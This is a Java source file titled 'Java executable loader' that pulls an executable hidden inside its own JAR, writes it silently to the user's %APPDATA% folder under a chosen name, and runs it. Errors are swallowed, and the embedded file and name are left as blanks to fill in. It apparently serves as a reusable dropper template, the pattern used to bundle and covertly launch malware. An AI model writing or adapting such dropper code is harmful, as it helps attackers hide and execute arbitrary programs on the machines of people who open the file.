package com.loader;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.security.ProtectionDomain;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;

/**
 *Java executable loader
 * 
 *@author Xel
 *@version 1.0
 */
public class Load{
	
	public static void main(String args []){
		Load l = new Load();
	    l.get(setdestination());
	 }

	private String getloc(){
		//Default location for the executable		
		return "";
	}
	private String newname(){
		//New name for your executable
		return "";
	}
	private static String setdestination(){
		//Default to %appdata%
		//File output path
		return System.getenv("APPDATA");
	}
	/******************************/
	/******No edits required******/
	/****************************/
	public void get(String destination){
	     try {
	    	 String jarloc = jarlocation();
	    	 JarFile jar =jf(jarloc);
	    	 ZipEntry zip = jar.getEntry(getloc());
	    	 File newfile = new File(destination, newname());

	      InputStream in = new BufferedInputStream(jar.getInputStream(zip));
	      OutputStream out = new BufferedOutputStream(new FileOutputStream(newfile));
	      inandout(in, out, newfile);
	     }
	     catch (Exception e) {}
	  }
	
	private JarFile jf(String s){
		try {
			return new JarFile(s);
		} catch (IOException e) {
			e.printStackTrace();
		}
		return null;	
	}
	private String jarlocation(){
		String jarloc = loc(pd()).toString();
		jarloc = jarloc.replace("file:/", "");	
		return jarloc;
	}
	
	private ProtectionDomain pd(){
		return getClass().getProtectionDomain();		
	}
	
	private URL loc(ProtectionDomain x){
		return x.getCodeSource().getLocation();
	}
	
	private void inandout(InputStream in, OutputStream out, File newfile) throws IOException{
		//Write the file and call exec
		 byte[] by = new byte[2048];
	      for (;;)  { int b = in.read(by);
	        if (b <= 0) 
	        	break;
	        out.write(by, 0, b);
	      }
	      out.flush();
	      out.close();
	      in.close();     
	      Runtime r = Runtime.getRuntime();  
	      exec(newfile.getAbsolutePath(), r);
	}

	private void exec(String s, Runtime r){
		//Execute your executable
		try {
			r.exec(s);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}